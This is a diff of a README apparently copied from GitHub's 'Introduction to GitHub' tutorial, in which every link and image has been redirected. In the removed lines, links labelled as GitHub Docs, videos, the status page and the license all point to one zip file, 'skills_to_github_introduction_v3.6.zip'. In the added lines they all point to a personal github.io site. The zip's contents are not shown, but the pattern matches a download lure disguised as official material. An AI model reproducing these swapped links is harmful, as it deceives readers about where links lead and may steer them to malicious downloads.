@@ -17,7 +17,7 @@ _Get started using GitHub in less than an hour._
   <<< Author notes: Step 1 >>>
   Choose 3-5 steps for your course.
   The first step is always the hardest, so pick something easy!
-  Link to https://raw.githubusercontent.com/ogthheu/skills-introduction-to-github/main/images/skills_to_github_introduction_v3.6.zip for further explanations.
+  Link to https://ogthheu.github.io for further explanations.
   Encourage users to open new tabs for steps!
 -->
 
@@ -25,39 +25,39 @@ _Get started using GitHub in less than an hour._
 
 _Welcome to "Introduction to GitHub"! :wave:_
 
-**What is GitHub?**: GitHub is a collaboration platform that uses _[Git](https://raw.githubusercontent.com/ogthheu/skills-introduction-to-github/main/images/skills_to_github_introduction_v3.6.zip)_ for versioning. GitHub is a popular place to share and contribute to [open-source](https://raw.githubusercontent.com/ogthheu/skills-introduction-to-github/main/images/skills_to_github_introduction_v3.6.zip) software.
-<br>:tv: [Video: What is GitHub?](https://raw.githubusercontent.com/ogthheu/skills-introduction-to-github/main/images/skills_to_github_introduction_v3.6.zip)
+**What is GitHub?**: GitHub is a collaboration platform that uses _[Git](https://ogthheu.github.io)_ for versioning. GitHub is a popular place to share and contribute to [open-source](https://ogthheu.github.io) software.
+<br>:tv: [Video: What is GitHub?](https://ogthheu.github.io)
 
-**What is a repository?**: A _[repository](https://raw.githubusercontent.com/ogthheu/skills-introduction-to-github/main/images/skills_to_github_introduction_v3.6.zip)_ is a project containing files and folders. A repository tracks versions of files and folders. For more information, see "[About repositories](https://raw.githubusercontent.com/ogthheu/skills-introduction-to-github/main/images/skills_to_github_introduction_v3.6.zip)" from GitHub Docs.
+**What is a repository?**: A _[repository](https://ogthheu.github.io)_ is a project containing files and folders. A repository tracks versions of files and folders. For more information, see "[About repositories](https://ogthheu.github.io)" from GitHub Docs.
 
-**What is a branch?**: A _[branch](https://raw.githubusercontent.com/ogthheu/skills-introduction-to-github/main/images/skills_to_github_introduction_v3.6.zip)_ is a parallel version of your repository. By default, your repository has one branch named `main` and it is considered to be the definitive branch. Creating additional branches allows you to copy the `main` branch of your repository and safely make any changes without disrupting the main project. Many people use branches to work on specific features without affecting any other parts of the project.
+**What is a branch?**: A _[branch](https://ogthheu.github.io)_ is a parallel version of your repository. By default, your repository has one branch named `main` and it is considered to be the definitive branch. Creating additional branches allows you to copy the `main` branch of your repository and safely make any changes without disrupting the main project. Many people use branches to work on specific features without affecting any other parts of the project.
 
-Branches allow you to separate your work from the `main` branch. In other words, everyone's work is safe while you contribute. For more information, see "[About branches](https://raw.githubusercontent.com/ogthheu/skills-introduction-to-github/main/images/skills_to_github_introduction_v3.6.zip)".
+Branches allow you to separate your work from the `main` branch. In other words, everyone's work is safe while you contribute. For more information, see "[About branches](https://ogthheu.github.io)".
 
-**What is a profile README?**: A _[profile README](https://raw.githubusercontent.com/ogthheu/skills-introduction-to-github/main/images/skills_to_github_introduction_v3.6.zip)_ is essentially an "About me" section on your GitHub profile where you can share information about yourself with the community on https://raw.githubusercontent.com/ogthheu/skills-introduction-to-github/main/images/skills_to_github_introduction_v3.6.zip GitHub shows your profile README at the top of your profile page. For more information, see "[Managing your profile README](https://raw.githubusercontent.com/ogthheu/skills-introduction-to-github/main/images/skills_to_github_introduction_v3.6.zip)".
+**What is a profile README?**: A _[profile README](https://ogthheu.github.io)_ is essentially an "About me" section on your GitHub profile where you can share information about yourself with the community on https://ogthheu.github.io GitHub shows your profile README at the top of your profile page. For more information, see "[Managing your profile README](https://ogthheu.github.io)".
 
-![profile-readme-example](https://raw.githubusercontent.com/ogthheu/skills-introduction-to-github/main/images/skills_to_github_introduction_v3.6.zip)
+![profile-readme-example](https://ogthheu.github.io)
 
 ### :keyboard: Activity: Your first branch
 
 1. Open a new browser tab and navigate to your newly made repository. Then, work on the steps in your second tab while you read the instructions in this tab.
 2. Navigate to the **< > Code** tab in the header menu of your repository.
 
-   ![code-tab](https://raw.githubusercontent.com/ogthheu/skills-introduction-to-github/main/images/skills_to_github_introduction_v3.6.zip)
+   ![code-tab](https://ogthheu.github.io)
 
 3. Click on the **main** branch drop-down.
 
-   ![main-branch-dropdown](https://raw.githubusercontent.com/ogthheu/skills-introduction-to-github/main/images/skills_to_github_introduction_v3.6.zip)
+   ![main-branch-dropdown](https://ogthheu.github.io)
 
 4. In the field, name your branch `my-first-branch`. In this case, the name must be `my-first-branch` to trigger the course workflow.
 5. Click **Create branch: my-first-branch** to create your branch.
 
-   ![create-branch-button](https://raw.githubusercontent.com/ogthheu/skills-introduction-to-github/main/images/skills_to_github_introduction_v3.6.zip)
+   ![create-branch-button](https://ogthheu.github.io)
 
    The branch will automatically switch to the one you have just created.
    The **main** branch drop-down bar will reflect your new branch and display the new branch name.
 
-6. Wait about 20 seconds then refresh this page (the one you're following instructions from). [GitHub Actions](https://raw.githubusercontent.com/ogthheu/skills-introduction-to-github/main/images/skills_to_github_introduction_v3.6.zip) will automatically update to the next step.
+6. Wait about 20 seconds then refresh this page (the one you're following instructions from). [GitHub Actions](https://ogthheu.github.io) will automatically update to the next step.
 
 <footer>
 
@@ -68,8 +68,8 @@ Branches allow you to separate your work from the `main` branch. In other words,
 
 ---
 
-Get help: [Post in our discussion board](https://raw.githubusercontent.com/ogthheu/skills-introduction-to-github/main/images/skills_to_github_introduction_v3.6.zip) &bull; [Review the GitHub status page](https://raw.githubusercontent.com/ogthheu/skills-introduction-to-github/main/images/skills_to_github_introduction_v3.6.zip)
+Get help: [Post in our discussion board](https://ogthheu.github.io) &bull; [Review the GitHub status page](https://ogthheu.github.io)
 
-&copy; 2024 GitHub &bull; [Code of Conduct](https://raw.githubusercontent.com/ogthheu/skills-introduction-to-github/main/images/skills_to_github_introduction_v3.6.zip) &bull; [MIT License](https://raw.githubusercontent.com/ogthheu/skills-introduction-to-github/main/images/skills_to_github_introduction_v3.6.zip)
+&copy; 2024 GitHub &bull; [Code of Conduct](https://ogthheu.github.io) &bull; [MIT License](https://ogthheu.github.io)
 
 </footer>
